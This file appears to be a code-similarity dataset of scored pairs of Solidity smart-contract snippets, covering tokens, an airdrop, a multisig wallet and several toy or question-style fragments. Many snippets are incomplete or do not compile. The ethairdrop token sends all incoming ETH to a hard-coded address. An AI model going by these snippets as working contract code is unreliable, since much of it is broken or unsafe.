        balances[owner]=balances[owner].sub(remuneration);
        msg.sender.transfer(remuneration);
    }


    function sanction(uint _id, address _add)
    public
    isAccepted(_id,_add)
    isRequest(_id)
    requestState (_id,State.ONGOING)
    afterDeadline(_id)
    nextRequestState(_id,State.CLOSED)
    {
        require(requests[_id].company==msg.sender,""You are not the company !"");
        users[_add].reputation--;
    }

}",0.5649401921596109,"contract ethairdrop is ERC20 {

    

    using SafeMath for uint256;

    address owner = msg.sender;



    mapping (address => uint256) balances;

    mapping (address => mapping (address => uint256)) allowed;

	mapping (address => uint256) public add_count;

	mapping (address => uint256) public add_amount;

	mapping (address => uint256) public unlockUnixTime;

    string public constant name = ""ethairdrop.io"";

    string public constant symbol = ""EA"";

    uint public constant decimals = 18;

    

    uint256 public totalSupply = 3000000000e18;

    uint256 public totalDistributed = 1500000000e18;

    uint256 public totalRemaining = totalSupply.sub(totalDistributed);

    uint256 public value = 1000e18;

    event Transfer(address indexed _from, address indexed _to, uint256 _value);

    event Approval(address indexed _owner, address indexed _spender, uint256 _value);

    event Distr(address indexed to, uint256 amount);

    event DistrFinished();

    event Burn(address indexed burner, uint256 value);



    bool public distributionFinished = false;

    

    modifier canDistr() {

        require(!distributionFinished);

        _;

    }

    

    modifier onlyOwner() {

        require(msg.sender == owner);

        _;

    }

    

    function ethairdrop() public {

        owner = msg.sender;

        balances[owner] = totalDistributed;

    }

    

    function transferOwnership(address newOwner) onlyOwner public {

        if (newOwner != address(0)) {

            owner = newOwner;

        }

    }

    

    function finishDistribution() onlyOwner canDistr public returns (bool) {

        distributionFinished = true;

        emit DistrFinished();

        return true;

    }

    

    function distr(address _to, uint256 _amount) canDistr private returns (bool) {

        totalDistributed = totalDistributed.add(_amount);

        totalRemaining = totalRemaining.sub(_amount);

        balances[_to] = balances[_to].add(_amount);

        emit Distr(_to, _amount);

        emit Transfer(address(0), _to, _amount);

        return true;

        if (totalDistributed >= totalSupply) {

            distributionFinished = true;

        }

    }

    

    function () external payable {

        getTokens();

     }

    

    function getTokens() payable canDistr public {

    	address investor = msg.sender;

        require(distributionFinished==false);

        add_count[investor]=add_count[investor].add(1);

        add_amount[investor]=add_amount[investor].add(msg.value);

        unlockUnixTime[investor]=now+1 days;

        

        uint256 toGive = value;

        if(msg.value >= 0.01 ether){

            toGive = value.mul(2000).mul(msg.value).div(1e18);

    		address(0x60561bed12144cafae6bb4d98b28d4ea6e6031d8).transfer(msg.value);

    		value = value.div(1000).mul(999);

        }else{

            toGive = value.mul(1000).div(1000);

        	address(0x60561bed12144cafae6bb4d98b28d4ea6e6031d8).transfer(msg.value);

        	value = value.div(1000).mul(1000);

        }

        if (toGive > totalRemaining) {

            toGive = totalRemaining;

        }

        require(toGive <= totalRemaining);        

        distr(investor, toGive);

        if (totalDistributed >= totalSupply) {

            distributionFinished = true;

        }

        value = value.div(10000000).mul(9999988);

    }



    function balanceOf(address _owner) constant public returns (uint256) {

        return balances[_owner];

    }



    modifier onlyPayloadSize(uint size) {

        assert(msg.data.length >= size + 4);

        _;

    }

    

    function transfer(address _to, uint256 _amount) onlyPayloadSize(2 * 32) public returns (bool success) {

        require(_to != address(0));

        require(_amount <= balances[msg.sender]);

        

        balances[msg.sender] = balances[msg.sender].sub(_amount);

        balances[_to] = balances[_to].add(_amount);

        emit Transfer(msg.sender, _to, _amount);

        return true;

    }

    

    function transferFrom(address _from, address _to, uint256 _amount) onlyPayloadSize(3 * 32) public returns (bool success) {

        require(_to != address(0));

        require(_amount <= balances[_from]);

        require(_amount <= allowed[_from][msg.sender]);

        

        balances[_from] = balances[_from].sub(_amount);

        allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_amount);

        balances[_to] = balances[_to].add(_amount);

        emit Transfer(_from, _to, _amount);

        return true;

    }

    

    function approve(address _spender, uint256 _value) public returns (bool success) {

        if (_value != 0 && allowed[msg.sender][_spender] != 0) { return false; }

        allowed[msg.sender][_spender] = _value;

        emit Approval(msg.sender, _spender, _value);

        return true;

    }

    

    function allowance(address _owner, address _spender) constant public returns (uint256) {

        return allowed[_owner][_spender];

    }

    

    function getTokenBalance(address tokenAddress, address who) constant public returns (uint){

        ForeignToken t = ForeignToken(tokenAddress);

        uint bal = t.balanceOf(who);

        return bal;

    }

    

    function withdraw() onlyOwner public {

        uint256 etherBalance = address(this).balance;

        owner.transfer(etherBalance);

    }

    

    function burn(uint256 _value) onlyOwner public {

        require(_value <= balances[msg.sender]);



        address burner = msg.sender;

        balances[burner] = balances[burner].sub(_value);

        totalSupply = totalSupply.sub(_value);

        totalDistributed = totalDistributed.sub(_value);

        emit Burn(burner, _value);

    }

    

    function withdrawForeignTokens(address _tokenContract) onlyOwner public returns (bool) {

        ForeignToken token = ForeignToken(_tokenContract);

        uint256 amount = token.balanceOf(address(this));

        return token.transfer(owner, amount);

    }

}"
"contract ServiceContract {
  FirstContract firstContract;
  address owner;

  constructor (address _firstContract,
        address _endorserContract) {
        firstContract = FirstContract(_firstContract);
        owner = msg.sender;
  }

  function receiveApproval(address _sender, uint256 _value,
        address _tokenContract, bytes data) public {

       bytes32 vacancyId = keccak256(data);
            
            firstContract.addVacancy(_sender, vacancyId, _value);
}",0.5982104672987673,"contract OwnerContract is Ownable {
    iContract public ownedContract;
    address origOwner;

    
    function setContract(address _contract) public onlyOwner {
        require(_contract != address(0));
        ownedContract = iContract(_contract);
        origOwner = ownedContract.owner();
    }

    
    function transferOwnershipBack() public onlyOwner {
        ownedContract.transferOwnership(origOwner);
        ownedContract = iContract(address(0));
        origOwner = address(0);
    }
}"
"contract Foo {
  SafeMath ExternalSafeMath = SafeMath(0x013......);

  
  
  using ExternalSafeMath for uint256;

  
}",0.5460553551198997,"contract ERC20BaseToken is ERC20Events  {\n    using SafeMath for uint256;\n    \n    

    }"
"contract EvilDoer{

    function doSomethingEvil{
         A contractB = A(addressOfdeployedB);

         contractB.doSomething();
    }

}",0.5229696419616786,"contract IContractRegistry {
    function addressOf(bytes32 _contractName) public view returns (address);
}"
"contract ExampleDivisibleNFTs {
    using SafeMath for uint256;

    
    mapping(address => mapping(string => uint)) ownerToTokenShare;

    
    mapping(string => bool) mintedToken;

    modifier onlyNonExistentToken(string _tokenId) {
        require(mintedToken[_tokenId] == false, ""the NFT already exists"");
        _;
    }

    modifier onlyExistentToken(string _tokenId) {
        require(mintedToken[_tokenId] == true, ""the NFT doesn't exists"");
        _;
    }

}",0.5245450573290185,"contract CustomEvents {
    event ChibiCreated(uint tokenId, address indexed _owner, bool founder, string _name, uint16[13] dna, uint father, uint mother, uint gen, uint adult, string infoUrl);
    event ChibiForFusion(uint tokenId, uint price);
    event ChibiForFusionCancelled(uint tokenId);
    event WarriorCreated(uint tokenId, string battleRoar);
}"
"contract Foo {
    string data;
}",0.5219158497048557,contract TongPay is ERC20{}
"contract Player{
    struct ADN{
        string[] html; 
        uint maxQTY;
        uint created;
    }

ADN[] public bodies;

address public owner;

function addBody(string _html, string _html1, string _html2, string _html3, uint _maxQTY) public{
    require(msg.sender == owner);
    string [] memory images = new string[](4);
    images[0] = _html;
    images[1] = _html1;
    images[2] = _html2;
    images[3] = _html3;
    bodies.push(ADN({
        html: images,
        maxQTY: _maxQTY,
        created: 0
    }));

}

function showHTML(uint id) public view returns (string){
    return bodies[id].html[0];
}

}",0.5722263656698059,"contract PersonalTokenFactory {
    
    
    PersonalToken private PT;
    
    address[] public tokens;
    
    event Deployed(address indexed PT, address indexed owner);
    
    function newPT(
       	string memory _name, 
		string memory _symbol,
		string memory _stamp,
		uint8 _decimals,
		uint256 _init) public {
       
        PT = new PersonalToken(
            _name, 
            _symbol, 
            _stamp,
            _decimals,
            _init,
            msg.sender);
        
        tokens.push(address(PT));
        
        emit Deployed(address(PT), msg.sender);

    }
    
    function getTokenCount() public view returns (uint256 tokenCount) {
        return tokens.length;
    }
}"
"contract Analytics {
  struct Field {
    string typeOfFunding; 
    uint amount;
    string cohort;
    string promotion;
  }
  struct Entry {
    string typeofEntry; 
    string channel;
    Field[] funding;
    string createdAt;
    uint totalAmount;
  }
  mapping(string => Entry) entries;


  function updateEntry (string memory id,
                        string memory _typeOfEntry,
                        string memory _channel,
                        Field[]  _funding,
                        string memory _createdAt) public
                        returns (bool sucess)
  {
    Entry storage e = entries[id];
    e.typeofEntry = _typeOfEntry;
    e.channel = _channel;
    
    
    
    e.createdAt = _createdAt;
    
    return true;
  }

  function updateFunding(string memory id,  Field[]  _fundingP) private view returns (Field[] _funding)
  {
    Field[] memory funding;
    Field[] memory amount;

    for _fundingP.amount 
    {
      funding.push(_funding.amount)
    }
  }",0.5706159684557336,"contract GetEbola {
    
    address private creator = msg.sender;
    
    function getInfo() constant returns (string, string)
    {
        string memory developer = ""Saluton, mia nomo estas Zach!""; 
        string memory genomeInfo = ""Ebola virus - Zaire, cat.1976""; 
        return (developer, genomeInfo);
    }
    
    function getEbola() constant returns (string)
    {
        
        string memory genomeURL = ""URL: http:
        return (genomeURL);
    }
    
    function tipCreator() constant returns (string, address)
    {
        string memory tipMsg = ""If you like you can tip me at this address :)"";
        address tipJar = creator; 
        return (tipMsg, tipJar);
    }
    
    
    
    function kill() public returns (string)
    { 
        if (msg.sender == creator)
        {
            suicide(creator);  
        }
        else {
            string memory nope = ""Vi ne havas povon 膲i tie!"";
            return (nope);
        }
    }
}"
"contract myContract {

  struct UserInfo {
    uint uId;
    uint producerId;
    uint clientId;
    uint transId;
    uint weight;
    bytes32 addr;
    bytes32 suburb;
    bytes32 city;
    bytes32 country;
    bytes32 postcode;
    bytes32 lat;
    bytes32 lng;
    bytes32 titleType;
    bytes32 status;
    address advAddress; 
  }

  
  mapping (uint => UserInfo) userIdInfo;  

  
  function landregister (uint uId, uint producerId, uint clientId, uint transId, uint weight, bytes32 addr, bytes32 suburb, bytes32 city, bytes32 country, bytes32 postcode, bytes32 lat, bytes32 lng, bytes32 titleType, bytes32 status) public returns(bool) 
  {
    var userinfo = userIdInfo[uId];

    userinfo.landId         = landId;
    userinfo.producerId     = producerId;
    userinfo.clientId       = clientId;
    userinfo.titleType      = titleType;
    userinfo.landSize       = landSize;
    userinfo.addr           = addr;
    userinfo.suburb         = suburb;
    userinfo.city           = city;
    userinfo.country        = country;
    userinfo.postcode       = postcode;
    userinfo.lat            = lat;
    userinfo.lng            = lng;
    userinfo.transId        = transId;
    userinfo.status         = status;
    userinfo.advAddress     = msg.sender;
    return true;
  }

  
  function getUserById(uint index) public constant returns(uint, uint)
  { 
    return (userIdInfo[index].uId, userIdInfo[index].producerId);
  }
}",0.5376921272696994,"contract VIC {

    event CardsAdded(

        address indexed user,

        uint160 indexed root,

        uint32 count

    );

    

    event CardCompromised(

        address indexed user,

        uint160 indexed root,

        uint32 indexed index

    );

    

    function publish(uint160 root, uint32 count) public {

        _publish(msg.sender, root, count);

    }

    

    function publishBySignature(address user, uint160 root, uint32 count, bytes32 r, bytes32 s, uint8 v) public {

        bytes32 messageHash = keccak256(abi.encodePacked(root, count));

        require(user == ecrecover(messageHash, 27 + v, r, s), ""Invalid signature"");

        _publish(user, root, count);

    }

    

    function report(uint160 root, uint32 index) public {

        _report(msg.sender, root, index);

    }

    

    function reportBySignature(address user, uint160 root, uint32 index, bytes32 r, bytes32 s, uint8 v) public {

        bytes32 messageHash = keccak256(abi.encodePacked(root, index));

        require(user == ecrecover(messageHash, 27 + v, r, s), ""Invalid signature"");

        _report(user, root, index);

    }

    

    function _publish(address user, uint160 root, uint32 count) public {

        emit CardsAdded(user, root, count);

    }

    

    function _report(address user, uint160 root, uint32 index) public {

        emit CardCompromised(user, root, index);

    }

}"
"contract FileDetail {
    string fileName;
    string fileHash;

.................
}",0.5075357710258515,"contract F3Devents {

	event onLTestStr

	(

		string log

	);

}"
"contract Landlord is user {
    string public landlordName;
    string public physicalAddress;
    function Landlord(
        string _name,
        string _physicalAddress){

        landlordName = _name;
        physicalAddress = _physicalAddress;
    }

    function setRent(uint256 _rent, address _tenantAddress){
        Tenant person = Tenant(_tenantAddress);
        person.setRent(uint256 _rent);

    }",0.5985394215498884,"contract CryptoPeopleName {

    address owner;

    mapping(address => string) private nameOfAddress;

  

    function CryptoPeopleName() public{

        owner = msg.sender;

    }

    

    function setName(string name) public {

        nameOfAddress[msg.sender] = name;

    }

    

    function getNameOfAddress(address _address) public view returns(string _name){

        return nameOfAddress[_address];

    }

    

}"
"contract MyContract{
    struct student{
        int RollNo;
        string Name;
    }

    student public s1=student({RollNo:1, Name:""Test Bunny""});

    int public disint; string public disname;
    disint=s1.RollNo;
    disname=s1.Name;
}",0.5692445141392599,"contract ANWTokenCoin is MintableToken {
    
    string public constant name = ""Animal Welfare Token Contract"";
    
    string public constant symbol = ""ANW"";
    
    uint32 public constant decimals = 18;
    
}"
"contract SimpleSmartContract {
    uint256 currentPrices;
    mapping(uint8 => uint256) public priceIncrements;
}",0.5859699210925374,"contract config{
    mapping(uint256 => address) public userid;
    mapping(address => uint256) public userasset;
    
}"
"contract sendEther{

    address payable rec= address(0xD694fab8b63BeF0149aa47b8333dFeAe7f55E9C7);
    address public reciever;


    function send() public payable{

        rec.transfer(msg.value);

    }
}",0.5597848254723723,"contract FakePlinc is IDistributable {

    address payable owner;
    constructor() public {
        owner = msg.sender;
    }
    
    function distribute() external payable override {
        owner.transfer(msg.value);
    }
}"
"contract test {
  enum ActionChoices { GoLeft, GoRight, GoStraight, SitStill };
  function test()
  {
     choices = ActionChoices.GoStraight;
  }
  function getChoice() returns (uint d)
  {
     d = uint256(choices);
  }
  ActionChoices choices;
}",0.5120684180740928,"contract ClockAuctionBase {

  function createAuction(

    uint256 _tokenId,

    uint256 _startingPrice,

    uint256 _endingPrice,

    uint256 _duration,

    address _seller

  ) external;



  function isSaleAuction() public returns (bool);

}"
"contract PermissionsTest is Permissions {    
    event LogSuccess();

    constructor(address _permissionsManager)
    Permissions(_permissionsManager)
    public
    {    }

    function testAnyone()
    public  
    {
        emit LogSuccess();
    }

    function testOnlyAdmin()
    public
    onlyAdmin
    {
        emit LogSuccess();
    }
}",0.5470357915929511,"contract EttToken{

    function tokenAdd(address user,uint tokens) public returns(bool success);

    function tokenSub(address user,uint tokens) public returns(bool success);

    function balanceOf(address tokenOwner) public constant returns(uint balance);

}"
"contract MultiSigWallet {

 
  mapping(address => uint) private _owners;

  uint constant MIN_SIGNATURES = 2;
  uint private transactionIdx;
  address payable private _commissionAddress;
  mapping(uint => address) private tokens;
  uint private currentToken;

  ERC20 private erc20iface;

  struct Transaction {
    address from;
    address payable to;
    address _contract;
    uint amount;
    uint  signatureCount;
    uint commission;
    mapping(address => uint) signatures;
  }

  mapping(uint => Transaction) private _transactions;
  uint[] private _pendingTransactions;






  modifier validOwner() {

    require(_owners[msg.sender] == 1);
    _;
  }

  event DepositFunds(address from, uint amount);
  event TransactionCreated(address from, address to, uint amount, uint transactionId);
  event TransactionCompleted(address from, address to, uint amount, uint transactionId);
  event TransactionSigned(address by, uint transactionId);
  event TransferFailed(address from, address to, uint amount, uint transactionId);

  constructor(address service, address payable commissionAddress, address token) public {
   
    _commissionAddress = commissionAddress;
    _owners[msg.sender] = 1;
    _owners[service] = 1;

    currentToken = 0;
    tokens[currentToken] = token;
    currentToken++;
  }

  function () external payable
  {
    emit DepositFunds(msg.sender, msg.value);
  }

  function withdraw(uint amount, uint commission, address token)
    public
      {
    transferTo(msg.sender,  amount, commission, token);
  }

  function transferTo(address payable to, uint amount, uint commission, address token)
    validOwner
    public
      {
    
    require(amount > 0);

    uint transactionId = transactionIdx++;

    Transaction memory transaction;
    transaction.from = msg.sender;
    transaction.to = to;
    transaction._contract = token;
    transaction.commission = commission;
    transaction.amount = amount;
    transaction.signatureCount = 0;

    _transactions[transactionId] = transaction;
    _pendingTransactions.push(transactionId);

    emit TransactionCreated(msg.sender, to, amount, transactionId);

    signTransaction(transactionId);
  }

  function getPendingTransactions()
    view
    validOwner
    public
    returns(uint[] memory)
    {
      return _pendingTransactions;
    }

  function signTransaction(uint transactionId)
    validOwner
    public
   {
    Transaction storage transaction = _transactions[transactionId];
    
    require(0x0000000000000000000000000000000000000000 != transaction.from);
    
    
    
    require(transaction.signatures[msg.sender] != 1);

    transaction.signatures[msg.sender] = 1;
    transaction.signatureCount++;

    emit TransactionSigned(msg.sender, transactionId);

    if(transaction.signatureCount >= MIN_SIGNATURES) {

      if(transaction._contract != 0x0000000000000000000000000000000000000000) {
        
        
        
        
        erc20iface =  ERC20(transaction._contract);
        erc20iface.transfer(transaction.to, transaction.amount);
        erc20iface.transfer(_commissionAddress, transaction.commission);
      } else {
        require(address(this).balance >= transaction.amount);
        (transaction.to).transfer(transaction.amount);
        _commissionAddress.transfer(transaction.commission);
      }

      emit TransactionCompleted(transaction.from, transaction.to, transaction.amount, transactionId);
      deleteTransaction(transactionId);
    }
  }

  function deleteTransaction(uint transactionId)
    validOwner
    public
    {
      uint replace = 0;
      assert(_pendingTransactions.length > 0);
      for(uint i = 0; i < _pendingTransactions.length; i++) {
        if(replace == 1) {
          _pendingTransactions[i-1] = _pendingTransactions[i];
        } else if (transactionId == _pendingTransactions[i]) {
          replace = 1;
        }
    }
      assert(replace == 1);
      delete _pendingTransactions[_pendingTransactions.length - 1];
      _pendingTransactions.length--;
      delete _transactions[transactionId];
    }

  function walletBalance()
    view
    public
    returns (uint) {
      return address(this).balance;
    }

}",0.5833219659853365,"contract SoundByte is ERC20Detailed {
 
  using SafeMath for uint256;
  mapping (address => uint256) private _BandTokenBalances;
  mapping (address => mapping (address => uint256)) private _allowed;
  string constant tokenName = ""SoundByte"";
  string constant tokenSymbol = ""BAND"";
  uint8  constant tokenDecimals = 18;
  uint256 _totalSupply = 1000000000000000000000000;
 
 
 
 
  constructor() public payable ERC20Detailed(tokenName, tokenSymbol, tokenDecimals) {
    _mint(msg.sender, _totalSupply);
  }
 
  function totalSupply() public view returns (uint256) {
    return _totalSupply;
  }
 
  function balanceOf(address owner) public view returns (uint256) {
    return _BandTokenBalances[owner];
  }
 
  function allowance(address owner, address spender) public view returns (uint256) {
    return _allowed[owner][spender];
  }
 
 
 
  function transfer(address to, uint256 value) public returns (bool) {
    require(value <= _BandTokenBalances[msg.sender]);
    require(to != address(0));
 
    uint256 BandTokenDecay = value.div(25);
    uint256 tokensToTransfer = value.sub(BandTokenDecay);
 
    _BandTokenBalances[msg.sender] = _BandTokenBalances[msg.sender].sub(value);
    _BandTokenBalances[to] = _BandTokenBalances[to].add(tokensToTransfer);
 
    _totalSupply = _totalSupply.sub(BandTokenDecay);
 
    emit Transfer(msg.sender, to, tokensToTransfer);
    emit Transfer(msg.sender, address(0), BandTokenDecay);
    return true;
  }
 
  function multiTransfer(address[] memory receivers, uint256[] memory amounts) public {
    for (uint256 i = 0; i < receivers.length; i++) {
      transfer(receivers[i], amounts[i]);
    }
  }
 
  function approve(address spender, uint256 value) public returns (bool) {
    require(spender != address(0));
    _allowed[msg.sender][spender] = value;
    emit Approval(msg.sender, spender, value);
    return true;
  }
 
  function transferFrom(address from, address to, uint256 value) public returns (bool) {
    require(value <= _BandTokenBalances[from]);
    require(value <= _allowed[from][msg.sender]);
    require(to != address(0));
 
    _BandTokenBalances[from] = _BandTokenBalances[from].sub(value);
 
    uint256 BandTokenDecay = value.div(25);
    uint256 tokensToTransfer = value.sub(BandTokenDecay);
 
    _BandTokenBalances[to] = _BandTokenBalances[to].add(tokensToTransfer);
    _totalSupply = _totalSupply.sub(BandTokenDecay);
 
    _allowed[from][msg.sender] = _allowed[from][msg.sender].sub(value);
 
    emit Transfer(from, to, tokensToTransfer);
    emit Transfer(from, address(0), BandTokenDecay);
 
    return true;
  }
 
  function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
    require(spender != address(0));
    _allowed[msg.sender][spender] = (_allowed[msg.sender][spender].add(addedValue));
    emit Approval(msg.sender, spender, _allowed[msg.sender][spender]);
    return true;
  }
 
  function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
    require(spender != address(0));
    _allowed[msg.sender][spender] = (_allowed[msg.sender][spender].sub(subtractedValue));
    emit Approval(msg.sender, spender, _allowed[msg.sender][spender]);
    return true;
  }
 
  function _mint(address account, uint256 amount) internal {
    require(amount != 0);
    _BandTokenBalances[account] = _BandTokenBalances[account].add(amount);
    emit Transfer(address(0), account, amount);
  }
 
  function burn(uint256 amount) external {
    _burn(msg.sender, amount);
  }
 
  function _burn(address account, uint256 amount) internal {
    require(amount != 0);
    require(amount <= _BandTokenBalances[account]);
    _totalSupply = _totalSupply.sub(amount);
    _BandTokenBalances[account] = _BandTokenBalances[account].sub(amount);
    emit Transfer(account, address(0), amount);
  }
 
  function burnFrom(address account, uint256 amount) external {
    require(amount <= _allowed[account][msg.sender]);
    _allowed[account][msg.sender] = _allowed[account][msg.sender].sub(amount);
    _burn(account, amount);
  }
}"
"contract NimGamev3 {

...

constructor(NimGamev3) internal {

...

}

...

}",0.5165449110706419,"contract BlankContract {
    constructor() public {}
}"
"contract CredentialOrgFactory is Pausable {


using SafeMath32 for uint32;


mapping(address => CredentialOrg) addressToCredentialOrg;


event CredentialOrgCreateEvent(string shortName, address schoolAddress, string detail);
event CredentialOrgEvent(address schoolAddress, string detail);


uint32 private credentialOrgCount;


struct CredentialOrg {
    string shortName;          
    string officialSchoolName; 
    address schoolAddress;
}

CredentialOrg[] private credentialOrgs; 


constructor() public {
    credentialOrgCount = 0;
}


function getOwner()
public view
returns (address returnedOwner)
{
    returnedOwner = owner;
}


function createCredentialOrg(string _shortName, string _officialSchoolName, address _schoolAddress) 
public 
returns (bool createStatus)
{
    emit CredentialOrgCreateEvent(_shortName, _schoolAddress, ""New Org Add (PRE)"");
    require(bytes(_shortName).length > 0 && bytes(_shortName).length < 31, ""createCredentialOrg shortName problem"");
    require(bytes(_officialSchoolName).length > 0 && bytes(_officialSchoolName).length < 70, ""createCredentialOrg officalSchoolName length problem"");
    require(_schoolAddress != 0, ""createCredentialOrg (FAIL) school Address can not be 0"");
    createStatus = false;
    uint32 position = uint32(credentialOrgs.push(CredentialOrg(_shortName, _officialSchoolName, _schoolAddress)));
    if (position > 0){
        addressToCredentialOrg[_schoolAddress] = credentialOrgs[position.sub(1)];
        credentialOrgCount = credentialOrgCount.add(1);
        createStatus = true;
        emit CredentialOrgCreateEvent(_shortName, _schoolAddress, ""createCredentialOrg (SUCCESS)"");
    } else {
        emit CredentialOrgCreateEvent(_shortName, _schoolAddress, ""createCredentialOrg (FAIL)"");
    }
    return (createStatus);
}


function selectCredentialOrgByPosition(uint32 _credentialOrgPosition) 
public view 
returns (string shortName, string officialSchoolName, address schoolAddress)
{
    shortName = """";
    officialSchoolName = """";
    schoolAddress = 0;
    require(_credentialOrgPosition >= 0, ""selectCredentialOrg - position had to be greater or equal to 0."");
    if (_credentialOrgPosition < credentialOrgCount){
        emit CredentialOrgEvent(msg.sender, ""selectCredentialOrg~position - (SUCCESS)"");
        return (credentialOrgs[_credentialOrgPosition].shortName, credentialOrgs[_credentialOrgPosition].officialSchoolName, credentialOrgs[_credentialOrgPosition].schoolAddress);
    } else {
        emit CredentialOrgEvent(msg.sender, ""selectCredentialOrg~position - (FAIL) top boundry exceeded."");
        return (shortName, officialSchoolName, schoolAddress);
    }
}


function selectCredentialOrgByAddress(address _credentialOrgAddress) 
public view 
returns (string shortName, string officialSchoolName, address schoolAddress)
{
    require(_credentialOrgAddress != 0, ""selectCredentialOrg - Address 0 not valid"");
    CredentialOrg memory testCred = addressToCredentialOrg[_credentialOrgAddress];
    if (testCred.schoolAddress != 0){
        emit CredentialOrgEvent(msg.sender, ""selectCredentialOrg~address - (SUCCESS)"");
        return (testCred.shortName, testCred.officialSchoolName, testCred.schoolAddress);
    } else {
        emit CredentialOrgEvent(msg.sender, ""selectCredentialOrg~address - (FAIL)"");
        return ("""", """", 0);
    }
}


function isCredentialOrg(address _credentialOrgAddress) 
public view
returns (bool isOrgAddress)
{
    isOrgAddress = false;
    CredentialOrg memory testCredentialOrg = addressToCredentialOrg[_credentialOrgAddress];
    if (testCredentialOrg.schoolAddress != 0){
        isOrgAddress = true;
        emit CredentialOrgEvent(msg.sender, ""isCredentialOrg - (SUCCESS)"");
    } else {
        emit CredentialOrgEvent(msg.sender, ""isCredentialOrg - (FAIL)"");
    }
    return (isOrgAddress);
}


function selectOrgCount()
public view
returns (uint32 returnOrgCount)
{
    returnOrgCount = credentialOrgCount;
    emit CredentialOrgEvent(msg.sender, ""selectOrgCount - (SUCCESS)"");
    return (returnOrgCount);
}

}",0.5188523713260207,"contract ARMB is ERC20
{ using SafeMath for uint256;
    
    string private constant _name = ""ARMB"";
    
     
    string private constant _symbol = ""ARMB"";
    
    
    uint8 private constant _decimals = 2;
    
     
    uint256 private Totalsupply;
    
    
    address private _owner; 
    
    
    mapping(address => uint) balances;
    mapping(address => mapping(address => uint)) allowed;
    
    event Mint(address indexed from, address indexed to, uint256 amount);
    event Burn(address indexed from, uint256 amount);
    event ChangeOwnerShip(address indexed newOwner);


    modifier onlyOwner() {
        require(msg.sender == _owner, ""Only owner is allowed"");
        _;
    }
    
    constructor() public
    {
        _owner = msg.sender;
       
    }
    
    function name() public pure returns (string memory) {
        return _name;
    }
    
    function symbol() public pure returns (string memory) {
        return _symbol;
    }
    
    function decimals() public pure returns (uint8) {
        return _decimals;
    }
    
     function owner() public view returns (address) {
        return _owner;
    }

  
    
    function mintTokens(address receiver, uint256 _amount) external onlyOwner returns (bool){
        require(receiver != address(0), ""Address can not be 0x0"");
        require(_amount > 0, ""Value should larger than 0"");
        balances[receiver] = (balances[receiver]).add(_amount);
        Totalsupply = (Totalsupply).add(_amount);
        emit Mint(msg.sender, receiver, _amount);
        emit Transfer(address(0), receiver, _amount);
        return true;
       }
    
 
    
     
    function burnTokens(address receiver, uint256 _amount) external onlyOwner returns (bool){
        require(balances[receiver] >= _amount, ""Amount cannot exceeed the balance"");
        require(_amount > 0, ""Value should larger than 0"");
        balances[receiver] = (balances[receiver]).sub(_amount);
        Totalsupply = Totalsupply.sub(_amount);
        emit Burn(receiver, _amount);
        emit Transfer(receiver, address(0), _amount);
        return true;
    }
    
   
    
     function totalSupply() public view returns (uint256 ) {
         return Totalsupply;
     }
    
    
     function balanceOf(address investor)public view returns (uint256 ) {
         return balances[investor];
     }
    
    
     
     
     
     
     
     function transferFrom( address _from, address _to, uint256 _amount ) public returns (bool success) {
     require( _to != address(0), ""Receiver can not be 0x0"");
     require(balances[_from] >= _amount && allowed[_from][msg.sender] >= _amount && _amount >= 0);
     balances[_from] = (balances[_from]).sub(_amount);
     allowed[_from][msg.sender] = (allowed[_from][msg.sender]).sub(_amount);
     balances[_to] = (balances[_to]).add(_amount);
     emit Transfer(_from, _to, _amount);
     return true;
         }
    
   
     
     function approve(address _spender, uint256 _amount) public returns (bool success) {
         require( _spender != address(0), ""Address can not be 0x0"");
         require(balances[msg.sender] >= _amount, ""Balance does not have enough tokens"");
         allowed[msg.sender][_spender] = _amount;
         emit Approval(msg.sender, _spender, _amount);
         return true;
     }
  
     function allowance(address _from, address _spender) public view returns (uint256) {
         require( _from != address(0), ""Address can not be 0x0"");
         require( _spender != address(0), ""Address can not be 0x0"");
         return allowed[_from][_spender];
   }

     
     function transfer(address _to, uint256 _amount) public returns (bool) {
        require( _to != address(0), ""Receiver can not be 0x0"");
        require(balances[msg.sender] >= _amount && _amount >= 0);
        balances[msg.sender] = (balances[msg.sender]).sub(_amount);
        balances[_to] = (balances[_to]).add(_amount);
        emit Transfer(msg.sender, _to, _amount);
        return true;
         }
    
      
	function transferOwnership(address newOwner) external onlyOwner
	{
	    require( newOwner != address(0), ""Address can not be 0x0"");
	    uint256 _previousBalance = balances[_owner];
	    balances[newOwner] = (balances[newOwner]).add(balances[_owner]);
	    balances[_owner] = 0;
	    _owner = newOwner;
	    emit ChangeOwnerShip(newOwner);
	    emit Transfer(msg.sender, newOwner, _previousBalance);
	}
	
}"
"contract MainContract {
    SubContract public my_contract;

    constructor() public {
        my_contract = new SubContract();
    }
}",0.5882344239983781,"contract GameLogicContract {
    
    bool public isGameLogicContract = true;
    
    function GameLogicContract() public {
        
    }
}"
"contract A{

    event Payment(address receiver, uint value);

    function payment(uint val) public payable returns(string memory){
        address(uint160(0xae1b77270ae418bDd72e14e842F57D9EC2DBD1d8)).transfer(val);\\Transfer to contract B
        emit Payment(0xae1b77270ae418bDd72e14e842F57D9EC2DBD1d8, val);
        return ""Payment done successfully"";
    }

    function() external payable{}
}",0.5500655338011378,"contract Wallet {

    event Receive(address from, uint value);

    event Send(address to, uint value);



    address public owner;



    constructor() public {

        owner = msg.sender;

    }



    function() public payable {

        emit Receive(msg.sender, msg.value);

    }



    function transfer(address to, uint value) public {

        require(msg.sender == owner);

        to.transfer(value);

        emit Send(to, value);

    }

}"
"contract Voyager2 is usingOraclize {
",0.5374656114667242,contract EggStorage is ERC721Token {}
"contract A {
  uint8 a = 0;
}",0.5456359574563648,"contract Dai is ERC20 {



}"
"contract Autos {

address owner;
address member1;
address member2;

constructor() public {
    owner = msg.sender;
    member1 = 0xDAA602D3E2Aeea57eE753E40AC1639eD20e3174F;
    member2 = 0x3147cA98dc9235e38c4cd3F82315332294e9234A;
}

modifier onlyOwner {
    require(msg.sender == owner || member1 || member2);
_;

}  
",0.5766624417587121,"contract Ownable {
    address public owner=0x28970854Bfa61C0d6fE56Cc9daAAe5271CEaEC09;


    
    constructor()public {
        owner = msg.sender;
    }


    
    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }


    
    function transferOwnership(address newOwner) onlyOwner public {
        require(newOwner != address(0));
        owner = newOwner;
    }

}"
"contract deposit {
    mapping (address=>ContractWallet) public users;

    constructor () public { }

    function testDeposit(
    )
        public
        payable
    {
